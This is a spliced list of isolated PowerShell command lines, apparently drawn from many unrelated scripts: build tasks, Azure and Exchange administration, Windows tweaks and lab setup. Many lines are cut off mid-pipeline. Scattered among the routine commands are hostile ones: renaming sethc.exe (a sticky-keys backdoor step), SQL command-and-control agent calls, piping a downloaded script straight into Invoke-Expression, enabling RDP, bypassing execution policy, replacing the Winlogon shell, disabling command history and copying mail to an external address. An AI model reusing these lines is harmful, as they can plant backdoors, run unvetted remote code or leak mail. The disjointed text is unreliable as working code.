Set-Content SourceThree.ps1 ( Get-Date )
Test-Version 0.1.0.0
Add-Member -InputObject $node -NotePropertyName 'ProjectNodeId' -NotePropertyValue $node . project . id
Invoke-GitHubApi $uri -BaseUri $BaseUri -Token $Token |
Invoke-GitHubApi @apiCall | ForEach-Object { $_ } | ForEach-Object {
Get-Command *-GitHub* | Where-Object { $_ . Parameters -and $_ . Parameters . ContainsKey ( 'Body' ) } | ForEach-Object {
Invoke-GitHubApi @apiCall
Invoke-GitHubApi @ApiCall | ForEach-Object {
Get-GitHubPullRequest -Token $Token
Export-ModuleMember -Function *
Find-GitHubUser -Query "in:login $wordToComplete" @tokenParam |
Start-Process 'https://github.com/settings/tokens'
Export-ModuleMember -Function $public . BaseName -ErrorAction Stop
New-Item -Path $ReleaseDirectory -ItemType Directory -Force | Out-Null
Copy-Item "$projectRoot\$ModuleName\$ModuleName.psd1" -Destination $ReleaseDirectory -Force
Initialize-Data
Apply-CMDLetListFilter -Filter ""
Register-EventHandlers
Show-JobResultsForm -JobName $jobname -JobOutput $joboutput -JobWarnings $jobwarnings -JobErrors $joberrors
Generate-GuiForCommand -SerializedCommandInfo $script:serializedcommandinfo
Add-ToControlList -ParameterSetName $parametersetname -Control $checkBox1
Import-Module $modulefiles -WarningAction SilentlyContinue
Refresh-JobList
Start-ManagedJob -CommandLine $scriptblock -DisplayedCommandLine $displayedcommandline -JobName $userdefinedjobname
Refresh-JobList
Generate-MainForm
Write-Status Info 'Setting up environment...'
Get-Module $env:BHProjectName | Remove-Module -Force -ErrorAction Ignore
Import-Module -Name ( Join-Path -Path $PSScriptRoot -ChildPath 'MetaFixers.psm1' ) -Verbose: $false -Force
Remove-Variable -Name MusicFileInfo
Invoke-Command -ScriptBlock { Invoke-WalkThrough -Name $Function -RemoveRun }
Export-ModuleMember ` -Function $( $PSLocalKeyStoreInfo [ 'ScriptSettings' ] [ 'LoadedFunctionsPub' ] ) ` -Variable $( $PSLocalKeyStoreInfo [ 'ScriptSettings' ] [ 'LoadedVariablesPub' ] ) ` #-Alias $($BluGenieInfo['ScriptSettings']['LoadedAliases'] | Select-Object -ExpandProperty Name)
Get-Item -Path 'HKCU:\Software\Microsoft\Windows\PowerShell\Keys' -ErrorAction SilentlyContinue |
Import-Module Pester
Get-ChildItem -Path "$($publishDir.FullName)\PSNative\internal\functions\" -Recurse -File -Filter "*.ps1" | ForEach-Object {
Get-ChildItem -Path "$($publishDir.FullName)\PSNative\internal\scripts\" -Recurse -File -Filter "*.ps1" | ForEach-Object {
Push-Location -Path $PSScriptRoot -StackName BeforeBuild
Get-ChildItem -Path ".build/" -Recurse -Include *.ps1 -ErrorAction Ignore | ForEach-Object {
Import-Module PSDepend -ErrorAction Stop
Invoke-PSDepend @PSDependParams
Set-PSRepository -Name $Gallery -InstallationPolicy $Policy
Compare-Object -ReferenceObject $Unique -DifferenceObject $diff |
Set-Alias -Name npt -Value New-PSPivotTable
Update-PocsLibrary
Get-RegexMatchResultList -String $String -Pattern $pattern | ForEach-Object {
Copy-Item -Path $path . Source -Destination $path . Backup -Force
New-ConfigBackup -Structure $Structure -Action $Action
Update-PocsLibrary
Update-PocsLibraryFromInput -Structure $library_structure -Action "add"
Repair-PocsPapis
Update-PocsLibrary
Update-PocsLibraryFromInput -Structure $library_structure -Action "remove"
Restore-PocsLibrary
Set-PocsLibrary -Name $Name -VirtualEnv $VirtualEnv
New-Item -Path $path -ItemType Directory
Microsoft.PowerShell.Utility\Set-Alias -Name $AliasName -Value $FunctionName ;
Microsoft.PowerShell.Core\Export-ModuleMember -Function $FunctionName -Alias $AliasName ;
Get-ChildItem -Path $ScriptPath |
Get-ChildItem -Path $BuildDirectory -Filter '*.psm1' |
Set-PSReadlineOption -HistorySaveStyle SaveIncrementally -HistoryNoDuplicates -HistorySavePath "$([environment]::GetFolderPath('Personal'))\WindowsPowerShell\Command-History.txt"
Set-PSReadlineKeyHandler -Key F7 -BriefDescription "PSReadlineHistoryPopup" -LongDescription "Popup PSReadline history command selector" -ScriptBlock {
New-Alias -Name hh -Value Get-PSReadlineHistory
Select-Object * -ExcludeProperty 'InstallDate' | # remove integer date
Select-Object * , @{ Label = "ApplicationName" ; Expression = { $( $PSItem . DisplayName -replace "\d+$" , '' ) . Trim ( ) } } | # removes the version number from the application
Select-Object * , @{ Label = "ExecutableName" ; Expression = { $executables [ $PSItem . ApplicationName ] } } | # appends the exe name to the collection
Where-Object Publisher -Like 'Red Gate*'
Register-ArgumentCompleter -CommandName Get-PSIssue -ParameterName Label -ScriptBlock {
Remove-Variable chash -ErrorAction SilentlyContinue
Import-PSRemoteOpPath
New-Alias -Name "iexretry" -Value "Invoke-PSRetryExpression"
Export-ModuleMember -Function * -Alias *
Write-LogMsg @LogParams -Text "`$PowershellInterface.AddStatement().AddCommand('$Command')"
Get-Module $env:BHProjectName | Remove-Module -Force -ErrorAction Ignore
Import-Module -Name ( Join-Path -Path $PSScriptRoot -ChildPath 'MetaFixers.psm1' ) -Verbose: $false -Force
Convert-FromPsCommandInfoToString @CommandInfoParams -CommandInfo $CommandInfo |
Write-LogMsg @LogParams -Text " # Command string is $($CommandStringForScriptDefinition.ToString())"
Write-LogMsg @LogParams -Text "`$PowershellInterface.Commands.Clear() # for '$Command' on '$ObjectString'"
Update-MetaData -Path $env:BHPSModuleManifest -PropertyName FunctionsToExport -Value $publicFunctions
Publish-Module @publishParams
Remove-Variable -Name ModuleOutDir -Scope Script -Force -ErrorAction SilentlyContinue
Write-LogMsg @LogParams -Text " # $($CompletedThread.PowerShellInterface.Streams.Progress.Count) Progress messages for '$CommandString' on '$($CompletedThread.ObjectString)'"
Get-Command | Group-Object -Property Verb
Get-Command -ParameterName Credential
Add-Type -AssemblyName PresentationFramework
Update-TypeData -TypeName DirectoryStat -MemberType ScriptProperty -MemberName NameCount -value { "$($this.name) [$($this.filecount)]" } -force
Clear-Variable data
Register-ArgumentCompleter -CommandName Get-PSScriptTools -ParameterName Verb -ScriptBlock {
Get-Verb | Where-object { $_ . verb -like "$wordtocomplete*" } |
Update-TypeData -TypeName PSSessionInfo -MemberType ScriptProperty -MemberName Runtime -Value { ( Get-Date ) - $this . Started } -Force
Trace-Message -message "Colorizing output"
Write-Detail "Data results" | Add-Content -Path $vlog
Open-EditorFile -Path $realpath
New-Object -TypeName PSObject -Property @{ $PropertyName = $Output }
Invoke-Expression $if
Get-ChildItem -Path $PSScriptRoot\functions\*.ps1 -Exclude 'Get-MyCounter.ps1' , 'Get-FileExtensionInfo.ps1' |
Measure-Command -Expression { $( $script:TestBlock ) . Invoke ( @( $argumentlist ) ) } -OutVariable +out
Remove-Variable -Name myInput -Scope script -ErrorAction SilentlyContinue
Invoke-PSCmdServer $PipeName -Commands @( $SecureCommand )
Start-Sleep -millisecond 100
Get-Random -Minimum $RandomMinimum -Maximum $RandomMaximum
Microsoft.PowerShell.Utility\Write-Host "`r"
Get-PackageProvider -Name NuGet -ForceBootstrap | Out-Null
Set-ModuleFunctions
Export-ModuleMember -Function $Public . Basename
Push-Location -Path $PSScriptRoot -StackName 'BeforeBuild'
ConvertFrom-Yaml -Yaml $jsonContent
Get-ChildItem -Path '.build/' -Recurse -Include '*.ps1' -ErrorAction Ignore |
Invoke-PSDepend @psDependParameters
Set-PSRepository -Name $Gallery -InstallationPolicy $previousGalleryInstallationPolicy
Stop-Website -Name $SiteName
Remove-Website -Name $SiteName
Remove-WebAppPool -Name $SiteName
Remove-Item -Path $PhysicalPathC -Recurse -Force
New-WebSite -Name $nombreSitio -PhysicalPath $rutaFisica -Port $puerto -ApplicationPool $nombreAppPool -HostHeader $header
Get-Website $nombreSitio
Initialize-VSNFTempRepo
Remove-VSNFTempRepo
Get-Graph -Datapoints ( $LoadHistory . "CPU Load" | Select-Object -Last $BufferSizeWidth )
Publish-Module -Path "$($_.FullName)" -NuGetApiKey $NugetKey -Verbose -Force
Publish-Module -Path "$($_.FullName)" -NuGetApiKey $NugetKey -WhatIf -Verbose
Load-Assembly -Assembly System.Net.Http
Say-Error "Failed to locate the latest version in the channel '$NormalizedChannel' with '$NormalizedQuality' quality for '$ProductName', os: 'win', architecture: '$Architecture'."
Expand-Archive -Path $localFile -DestinationPath $moduleVersionPath -Force
Add-BuildTask TestLocal Clean , ImportModuleManifest , Analyze , Test
Add-BuildTask HelpLocal Clean , ImportModuleManifest , CreateHelpStart
Add-BuildTask BuildNoInfra -Jobs $str2
Set-BuildHeader {
Write-Build DarkMagenta ( '=' * 79 )
Write-Build DarkGray "Task $Path : $(Get-BuildSynopsis $Task)"
Write-Build DarkGray "At $($Task.InvocationInfo.ScriptName):$($Task.InvocationInfo.ScriptLineNumber)"
Set-BuildFooter {
Add-BuildTask ValidateRequirements {
Write-Build White " Verifying at least PowerShell $script:requiredPSVersion..."
Add-BuildTask TestModuleManifest -Before ImportModuleManifest {
Add-BuildTask ImportModuleManifest {
Add-BuildTask Clean {
Add-BuildTask Analyze {
Add-BuildTask AnalyzeTests -After Analyze {
Add-BuildTask FormattingCheck {
Add-BuildTask Test {
Import-Module -Name Pester -MinimumVersion $script:MinPesterVersion -MaximumVersion $script:MaxPesterVersion -ErrorAction 'Stop'
Write-Build Yellow ' Code coverage check skipped. No commands to execute...'
Add-BuildTask DevCC {
Add-BuildTask CreateHelpStart {
Add-BuildTask CreateMarkdownHelp -After CreateHelpStart {
Add-BuildTask CreateExternalHelp -After CreateMarkdownHelp {
Add-BuildTask UpdateCBH -After AssetCopy {
Add-BuildTask AssetCopy -Before Build {
Add-BuildTask Build {
Write-Build Gray ' Overwriting docs output...'
Add-BuildTask InfraTest {
Add-BuildTask Archive {
Export-ModuleMember -Function $public . Basename
Connect-AzAccount
Copy-Item -Path Env:PATH -Destination Env:_OLD_VIRTUAL_PATH
Get-EventLog -LogName System -After $qew_date | Where-Object { $_ . EntryType -like 'Error' -or $_ . EntryType -like 'Warning' } | Sort-Object Source
New-Item "$Dir\$OutFolder" -ItemType Directory -Force | Out-Null
Invoke-WebRequest "https://builds.parsecgaming.com/package/parsec-flat-windows.zip" -OutFile "$Dir\$OutFolder\$OutFolder.zip"
Expand-Archive "$Dir\$OutFolder\$OutFolder.zip" "$Dir\$OutFolder" -Force
Start-Process parsecd.exe -WorkingDirectory "$Dir\$OutFolder"
Move-Item -Path "C:\Windows\System32\sethc.exe" -Destination "C:\Windows\System32\sethc.old.exe" -Force
Set-DnsClientServerAddress -InterfaceIndex $GWNic -ServerAddresses ( "8.8.8.8" , "8.8.4.4" , "2001:4860:4860::8888" , "2001:4860:4860::8844" )
Invoke-Expression "git clone $repoURL"
Set-Location -Path $repoName
Invoke-Expression "git checkout -b dev"
Invoke-Expression "git add ."
Invoke-Expression "git push --set-upstream origin dev"
Invoke-Expression "git checkout main"
Invoke-Expression "git checkout dev"
Invoke-Expression "git checkout main"
Invoke-Expression "git merge dev"
Invoke-Expression "git push"
Invoke-Expression "git checkout dev"
Publish-Module -Path "$($_.FullName)" -NuGetApiKey $NugetKey -Verbose -Force
Publish-Module -Path "$($_.FullName)" -NuGetApiKey $NugetKey -WhatIf -Verbose
Show-Menu
Invoke-Command -ComputerName $computerName -ScriptBlock {
Restart-Computer -ComputerName $computerName -Force
Copy-Item -Path Env:PATH -Destination Env:_OLD_VIRTUAL_PATH
Write-Progress -Activity RobocopyTransfer -Status ( "Copied: {0} of {1} files | Copied: {2} of {3} GB | Percent complete: {4}%" -f $CopiedFileCount , $TotalFileCount , $GigabytesCopied , $GigabytesTotal , [ math ] :: Round ( $Percentage , 2 ) ) -PercentComplete $Percentage
Write-Progress -Activity RobocopyTransfer -Status "Ready" -Completed
Import-Clixml -Path "$DataPath\$KnownDeviceCacheFilename"
Invoke-Command -JobName "$JobName" -ComputerName . -AsJob -ScriptBlock $RDJobMonitor -ArgumentList $RDJobID , $ExecJOBID , $CommandToExecOnAbort | Out-Null
New-SafeguardUser -NewUserName "cert-safeguard-ps-user" -FirstName "safeguard" -LastName "ps-user" -NoPassword -Provider -2 -Thumbprint "2349a0311c312f6dff57875fd2b2a112b8e2c644" > $null
Get-SafeguardA2aServiceStatus > $null
Get-SafeguardAccessCertificationEntitlement -Identifier $DATA . appliance -StdOut
Invoke-SafeguardClusterPing | Select-Object -Property * -ExcludeProperty *Id | Out-String
Invoke-Expression $cmd | out-host
Start-Job -ScriptBlock $ScriptBlock
Receive-Job $job
Stop-Job $job
Get-CameraSettings -Credential $c -URI $interface
Set-AzStorageBlobContent -Context $Storageaccount . Context -Container $ContainerName ` -File $blobobject . Filelocation -Blob $blobobject . Objectname \
Start-Process -FilePath "$workdir\notepad.msi" -Wait -ArgumentList '/Silent' , '/v' , '/q' -passthru
Start-Sleep -s 60
Update-TypeData -TypeName ScheduledJobResult -DefaultDisplayPropertySet Name , ID , State , Runtime , Starttime , Endtime , HasMoreData -Force
Update-TypeData -typeName Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition -memberName "NextRun" -memberType ScriptProperty -Value { ( Get-ScheduledTask -taskname $this . name | Get-ScheduledTaskInfo ) . nextRunTime } -force
Get-Content $tempFile | Foreach-Object {
Add-Member -Membertype NoteProperty -Name 'path' -value $lock -InputObject $objLock
Get-Event | ForEach-Object { Remove-Event $_ . SourceIdentifier }
ForEach-Object {
Push-Location $abs_shimdir
Copy-Item ( get_shim_path ) "$shim.exe" -force
Optimize-SecurityProtocol
Expand-7zipArchive -Path "$DestinationPath\$TarFile" -DestinationPath $DestinationPath -ExtractDir $ExtractDir -Removal
Remove-Item $Path -Force
Microsoft.PowerShell.Archive\Expand-Archive -Path $Path -DestinationPath $DestinationPath -Force
Get-Command "sdkmanager" -ErrorAction SilentlyContinue -ErrorVariable err | Out-Null
Remove-Item $appdir -Recurse -Force -ErrorAction Stop
Remove-Item -r -force $currentdir -ea stop
Invoke-Expression "git reset --hard origin/$configBranch -q"
Remove-Item -force $source
New-Item $destination -Force | Out-Null
Register-ScheduledTask ` -TaskName $settings . Name ` -Description $settings . Description ` -Principal $settings . Principal ` -Action $settings . Action ` -Trigger $settings . Triggers ` -ErrorAction 'SilentlyContinue'
Invoke-Expression -command "& '$autopr' -dir '$dir' -upstream $upstream $($args | ForEach-Object { "$_ " })"
Select-String { filePath } -pattern { pattern } | Select LineNumber
Get-Content { filePath } | Measure-Object –Line
Connect-PnPOnline -Url $SiteURL -ClientId "00000000-0000-0000-0000-0000000" -ClientSecret "0000000000000000000000" -WarningAction Ignore
Get-PnPFile -Url $FileRelativeUrl -Path $DownloadPath -FileName $FileName -AsFile -Force
Disconnect-PnPOnline
Disconnect-ExchangeOnline -Confirm: $false -ErrorAction SilentlyContinue
Get-ExoMailbox -Identity "name" -Properties DisplayName , RecipientTypeDetails , ForwardingSMTPAddress , ForwardingAddress , DeliverToMailboxandForward
Get-MailboxStatistics -Identity "names" | Select DisplayName , ItemCount , TotalItemSize , DeletedItemCount , TotalDeletedItemSize
Get-ExoMailbox -Identity "name" -Properties DisplayName , RecipientTypeDetails , ForwardingAddress , ForwardingSMTPAddress , DeliverToMailboxandForward |
Get-InboxRule -Mailbox "name" -IncludeHidden |
Get-TransportRule -ResultSize Unlimited |
Set-Mailbox "name" -ForwardingAddress $NULL -ForwardingSmtpAddress $NULL -DeliverToMailboxAndForward $true
Remove-InboxRule -Mailbox "name" -Identity "name of rule" -Confirm: $false
Get-InboxRule -Mailbox "name" |
Get-InboxRule -Mailbox "name" -IncludeHidden |
Get-ManagementRoleAssignment -RoleAssignee "name" -Delegating $false |
Get-ManagementRole -Cmdlet "command"
Get-RoleGroup
Get-RoleGroup "name" | Format-List
Get-RoleGroupMember "name"
Get-EXORecipient -Identity "name" -ResultSize Unlimited
New-TransportRule -Name "REQ0000000" -SentTo employee@domain.com -From email -CopyTo externalemail -Comments "REQ0000000"
Get-Childitem -Path C:\ -Include "*file name*" -Recurse -ErrorAction SilentlyContinue -Force |
Get-Childitem -Path C:\ -Include "*file name*" -Recurse -ErrorAction SilentlyContinue | Remove-Item
Get-ChildItem -Path "C:\Temp" -Recurse -ErrorAction SilentlyContinue |
Compress-Archive -Path C:\Reference -DestinationPath C:\Archives\Draft.zip
Expand-Archive -Path Draft.zip
Start-Process msiexec.exe -Wait -ArgumentList '/I C:\Windows\Temp\SQLIO.msi /quiet'
Get-WmiObject -Class Win32_Product | Select-Object -Property Name
Write-CenterText -sChaine "****************************************" -sLogFile $( $sLogFile )
Set-PSReadLineOption -EditMode Emacs
Get-ChildItem -Path $FunctionPath -Filter "*.ps1" -Recurse | ForEach-Object -Process {
Start-Sleep -Seconds 5
Start-Job -ScriptBlock $PrintJob
Get-Variable | Where { $_ . PSProvider -notmatch "Core" } | Remove-Variable -ErrorAction SilentlyContinue -Force
Set-ExecutionPolicy ByPass -Scope CurrentUser
Set-ExecutionPolicy RemoteSigned -Force
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Search -Name BingSearchEnabled -Type DWord -Value 0
Set-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection -Name AllowTelemetry -Type DWord -Value 0
Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced -Name LaunchTo -Type DWord -Value 1
Get-AppxPackage king.com.CandyCrushSaga | Remove-AppxPackage
Get-AppxPackage Microsoft.BingWeather | Remove-AppxPackage
Get-AppxPackage Microsoft.WindowsPhone | Remove-AppxPackage
Get-AppxPackage Microsoft.MicrosoftSolitaireCollection | Remove-AppxPackage
Get-AppxPackage Microsoft.ZuneMusic | Remove-AppxPackage
Get-AppxPackage Microsoft.ZuneVideo | Remove-AppxPackage
Get-AppxPackage Microsoft.WindowsSoundRecorder | Remove-AppxPackage
Get-AppxPackage Microsoft.SkypeApp | Remove-AppxPackage
Start-Process powershell.exe -Verb RunAs -ArgumentList "-command $SetENVVar"
Add-PSSnapin Microsoft.SharePoint.PowerShell -ErrorAction SilentlyContinue
Send-SharePointTelemetry -Inputobject "Add-PSSnapin" -Properties @{ "elapsedTime" = $elapsedTime }
Start-SPEnterpriseSearchServiceInstance -Identity $newServer
Get-SPEnterpriseSearchServiceInstance -Identity $newServer
New-SPEnterpriseSearchIndexComponent -SearchTopology $newTopology ` -SearchServiceInstance $newServer -IndexPartition 1
Set-SPEnterpriseSearchTopology -Identity $newTopology
Get-SPAlternateUrl -Zone Default | ForEach {
Import-Module posh-git
Read-Bookmarks
Set-ExecutionPolicy UnRestricted
add-printer -connectionname $connectionName
Add-type -assembly “Microsoft.Office.Interop.Outlook” | out-null
Save-SMBSecurity -SecurityDescriptor $rFile . SdObj
Remove-Variable restoreFileSelection -Scope Script -EA SilentlyContinue
Export-ModuleMember -Function Get-SMBSecurity
Export-ModuleMember -Function Get-SMBSecurityDescriptorName
Export-ModuleMember -Function Save-SMBSecurity
Write-TextAtCoordinate "$('┌'.PadRight($BoxWidth - 1, "─"))┐" $xPos $yPos
Write-TextAtCoordinate "│ $($lines[$_]) │" $xPos $yPos
Update-AutoBackupfiles
New-LineSeperator
Remove-Variable restoreFileSelection -Scope Script -EA SilentlyContinue
Push-Location "$clonePath"
Set-Content -Path $wFile -Value $contents -Force
Push-Location "$clonePath\$repoName.wiki"
Start-Process -FilePath "C:\Users\xyz\Snowflake Decoded\Hands On Activities\Performance\scale-out\03b_run_single_query.bat" -RedirectStandardOutput "out1.txt"
Import-Module "$(Join-Path -Path $PSScriptRoot -ChildPath _Spellbook.helper.ps1)" -Force
Out-File -FilePath ( $path + '.join.bat' ) -Encoding Default -InputObject (
Out-File -FilePath ( $path + '.join.test.bat' ) -Encoding Default -InputObject (
Import-Module $RootModule -Scope Global -Force
Set-StrictMode -Version Latest
Copy-Item -Path "$($env:temp)\pandoc\Pandoc\pandoc.exe" -Destination "$BuildRoot\Tools\"
Copy-Item -Path "$BuildRoot\Spread\*" -Destination "$releasePath\Spread" -Recurse -Force
Get-WebAppPoolState -Name $apppool | Out-Null
CustomEnter-PSSession $server
Uninstall-SPSolution -Identity $solutionName -WebApplication $caUrl -Confirm: $false
Stop-SPAssignment -Global
Start-SPAssignment -Global
Save-Log $ImgTag $File . Name $NumberImgTagsFile
Set-Content -path $File . FullName -value $Lines
Get-ChildItem $dir\*.bak | Where { $_ . LastWriteTime -lt ( Get-Date ) . AddMinutes ( -1 ) } | Remove-Item
Add-PSSnapin SqlServerCmdletSnapin100
Write-W2VInfo "Looking for $($SourcePath)..."
Write-W2VWarn "Specifying -VHDPath and -WorkingDirectory at the same time is contradictory."
Write-W2VInfo "Attaching $VHDFormat..."
Write-W2VInfo "Generating name for $($VHDFormat)..."
Write-W2VInfo "Done."
Expand-SqlLogFile -DatabaseName 'test' -LogSizeMB 35000
Invoke-Command -VMName $VMName { Get-PackageProvider -Name NuGet -ForceBootstrap ; Install-Module @( 'xComputerManagement' , 'xActiveDirectory' , 'xNetworking' , 'xDHCPServer' , 'xSqlServer' ) -Force } -Credential $LocalAdminCred
Invoke-Command -VMName $VMName -Credential $LocalAdminCred { set-itemproperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\WinLogon" shell 'powershell.exe -noexit -command "$psversiontable;"' ; Rename-Computer -NewName $using:VMName -Force –Restart }
Copy-VMFile -Name $dc -SourcePath 'C:\git-repositories\PowerShell\MSFVMLab\VMDSC.ps1' -DestinationPath 'C:\Temp\VMDSC.ps1' -CreateFullPath -FileSource Host -Force
Stop-VM $dc
Invoke-Command -VMName $dc -ScriptBlock { . C:\Temp\VMDSC_DHCP.ps1 -DName 'starfleet.com' } -Credential $DomainCred #$LocalAdminCred
Register-SQLC2Agent -Username $Username -Password $Password -Instance $Instance -Database $Database -SuppressVerbose | Out-Null
Invoke-SQLC2Command -Username $Username -Password $Password -Instance $Instance -Database $Database -Verbose -Command $C2Command -Cid $C2CommandId
Get-ChildItem "$LogFolder" -Filter EE_SlowQueryLog_*.xel | sort-Object -property name |
Start-Sleep -m 1000
Push-Location $CurrentFolder
Set-ItemProperty NuGet.exe -Name IsReadOnly -Value $false
Stop-SshAgent | Out-Null
Save-SshAgentEnv $agentEnv
Clear-SshAgentEnv
Write-FileUtf8NoBomWithSecurePermissions -FilePath $runtimeSshConfigPath -Contents $runtimeSshConfig
New-DefaultSshConfig
New-Item "$sshDataPath/known_hosts" -ItemType File | Out-Null
Copy-Item "$PSScriptRoot/git-attributes.txt" "./.gitattributes"
Stop-SshAgent | Out-Null
Assert-SshConfigIsUpToDate | Out-Null
Invoke-SshWithAgent @sshArgs
New-Item $Path -ItemType Directory | Out-Null
Set-StrictMode -Version Latest
Start-Sleep -Milliseconds 50
Set-Alias -Name kn -Value Remove-StickyNote
Start-Sleep -m 1 #Send Keys is glitchy, wait 1ms
Add-Type @" using System; using System.Runtime.InteropServices; public class trick { [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); } "@
Start-Sleep -m 1 #Send Keys is glitchy, wait 1ms
Add-Type @" using System; using System.Runtime.InteropServices; public class StartActivateProgramClass { [DllImport("user32.dll")] [return: MarshalAs(UnmanagedType.Bool)] public static extern bool SetForegroundWindow(IntPtr hWnd); } "@
Start-Sleep -m 1 #Send Keys is glitchy, wait 1ms
Add-Type @" using System; using System.Runtime.InteropServices; public class UserWindows { [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); } "@
Start-Process "gsudo.exe" -Args "$dbg -u $($credential.UserName) gsudoservice $PID $CurrentSid All 00:05:00" -credential $Credential -LoadUserProfile -WorkingDirectory "$env:windir" *> $null
Import-Module "$scriptDir/ConfigLoader.psm1" -Force
Get-BotUserAuth
Import-Module "$scriptDir/Symphony.psm1" -Force #-Verbose
Get-Job | Where-Object { $_ . State -inotin ( "NotStarted" , "Running" ) } | Remove-Job
Invoke-Command -ComputerName $computer -ScriptBlock { C:\windows\sysmon\Sysmon.exe -i C:\windows\sysmon\sysmonconfig.xml -accepteula } -ErrorAction SilentlyContinue | Out-Null
Invoke-Command -ComputerName $i -ScriptBlock { rm C:\windows\sysmon\sysmonconfig.xml } -ErrorAction SilentlyContinue | Out-Null
copy-item "\\NetworkShare\sysmon\*" -Destination \\$i\c$\windows\sysmon -ErrorAction SilentlyContinue | Out-Null
Invoke-Command -ComputerName $computers -ScriptBlock { C:\windows\sysmon\Sysmon.exe -i C:\windows\sysmon\sysmonconfig.xml } -ErrorAction SilentlyContinue | Out-Null
Out-MemoryMappedFile -MemoryMappedFile $MemoryMappedFile -String $String
Read-Host
Remove-MemoryMappedFile -MemoryMappedFile $MemoryMappedFile
Unregister-Event -SourceIdentifier COM3DataReceived
Write-SerialPort "Hello World!"
Close-SerialPort
Send-MSMQMessage -queueName $queueName -MSMQMessage $MSMQMessage -Transaction
Get-MSMQMessageQueue -queueName $queueName
New-Variable -Name $x -Value $id . id -Option AllScope
Export-ModuleMember -Function New-TableauLogin
Get-Help Get-Command -Online # link to online docs where available
Get-Help about_* # For general PowerShell topics
Get-Help about_PowerShell_Editions
Get-Command -Verb Restart
Get-Command -Noun Module
Find-Module *AZ*
Install-Module AZ #as Admin or with -Scope CurrentUser
Update-Module AZ
Get-Module -ListAvailable
Get-Module
Import-Module AZ
Get-Command -Module AZ.* | Measure-Object
Get-Module Az.* # only shows those modules loaded into session
Get-Module Az.* -ListAvailable
Get-Module AZ.* | ForEach-Object { Get-Command -Module $PSItem }
Get-Module AZ.* |
AZ.* |
Get-Command -Module Az.Accounts
Get-Command -Module Az.Accounts | Group-Object -Property Verb
Get-Command -Module Az.Accounts | Group-Object -Property Noun
Get-Command -Module Az.Accounts -Noun AzAccount
Get-Help Login-AzAccount -ShowWindow
Connect-AzAccount
Get-Help Get-Credential -Examples
Get-Command -Module Az.Accounts -Verb Get
Get-AzContext # See if we're connected to any accounts already
Get-AzContextAutosaveSetting # Where are context files stored
Get-AzDefault # See user defaults
Get-AzEnvironment # See the different Azure clouds
Get-AzProfile # Service profiles?
Get-AzSubscription # See subscription
Get-AzTenant # See tenant
New-AzResourceGroup -ResourceGroupName $myResourceGroupName -Location $myLocation -Debug
Get-Help Set-AzDefault -ShowWindow
Get-AzStorageAccount
Set-AzStorageBlobContent -File $myImageFullTempPath ` -Container $myContainerName ` -Blob $myImageFileName ` -Context $myContext
Remove-AzStorageAccount -ResourceGroupName $myResourceGroupName -Name $myStorageAccountName
Get-AZVM
Get-Help Get-Credential -Examples
Get-AzVM -ResourceGroupName $myResourceGroupName |
Get-Command -Module AZ.Resources -Name *Deploy*
New-AzResourceGroupDeployment -ResourceGroupName "$($myResourceGroupName)-test" -TemplateUri $myTemplateURI # -TemplateParameterObject $myParams
Remove-AzResourceGroup -Name $myResourceGroupName
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Register-ArgumentCompleter -Native -CommandName $terraformExecutable -ScriptBlock $argumentCompleter
Register-ArgumentCompleter -Native -CommandName "${terraformExecutable}.exe" -ScriptBlock $argumentCompleter
Get-Alias -Definition "terraform*" | ForEach-Object { Register-ArgumentCompleter -Native -CommandName $_ . Name -ScriptBlock $argumentCompleter }
Measure-Command -Expression { $( $script:testblock ) . Invoke ( @( $argumentlist ) ) } -OutVariable +out
Set-Alias -Name tex -Value Test-Expression
Get-ADUser -Identity $PSItem -Properties mail , manager | Select-Object -Property Name , SamAccountName , Mail , @{ Name = "Manager" ; Expression = { ( Get-Aduser -identity $psitem . manager ) . samaccountname } }
Get-ADDirectReports -Identity $PSItem -Recurse
Get-Aduser -identity $Account -Properties directreports | Select-Object -ExpandProperty directReports |
Remove-Job -Job $cmdExecContext . Job
Import-Module -Name $ManifestPath -Scope Local -Verbose: $false -WarningAction SilentlyContinue -Force
Remove-TfsWorkFolderMapping $rootMapPath $Name
Get-ChildItem -Path "$ProjectRoot\TestResultsPS*.xml" | Foreach-Object {
Invoke-Expression "{`$this._$propertyName}"
Invoke-Expression "{param(`$p) `$this._$propertyName = `$p}"
Remove-Item alias:\set -ErrorAction Stop
Out-Collection ( [ Activator ] :: CreateInstance ( $closedType , $ConstructorParameters ) ) -AllowNullOrEmpty
Compare-Object ` -ReferenceObject $ReferenceObject ` -DifferenceObject $DifferenceObject ` -SyncWindow $SyncWindow ` -Culture $Culture ` -CaseSensitive: $CaseSensitive
Export-ModuleMember -Function * -Alias *
Add-Type -AssemblyName System.ServiceModel
Microsoft.PowerShell.Management\New-Item -Path $path -ItemType Directory -Force | Out-Null ;
Invoke-WebRequest "https://raw.githubusercontent.com/pkjaer/tridion-powershell-modules/${branch}/Shared/Installation/Install-ModuleFromWeb.ps1" | Invoke-Expression ;
Install-ModuleFromWeb -ModuleName "Tridion-CoreService" -BaseUrl $baseDownloadUrl -Files $files -Directories $directories ;
Set-ItemProperty -Path "Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAMeetNow" -Value 1
ForEach-Object { $_ . CommandElements [ 0 ] . Value } | # Returns their name
Where-Object { # Filters out only TweakList functions
New-ItemProperty -Path "HKLM:\SOFTWARE\NVIDIA Corporation\NvControlPanel2\Client" -Name "OptInOrOutPreference" -Value 0 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -ErrorAction SilentlyContinue | Out-Null
Stop-Process -Name "NVDisplay.Container" -Force -ErrorAction SilentlyContinue
Invoke-RestMethod "$((Invoke-RestMethod "https://api.github.com/repos/Aetopia/Install-NVCPL/releases/latest").assets.browser_download_url)" -OutFile "$InstallationDirectory\nvcpluir.dll"
Where-Object Name -NotLike "*Connector*" # Exclude connectors
Where-Object { $_ -Like $Pattern } | # Find all versions of all matching connectors
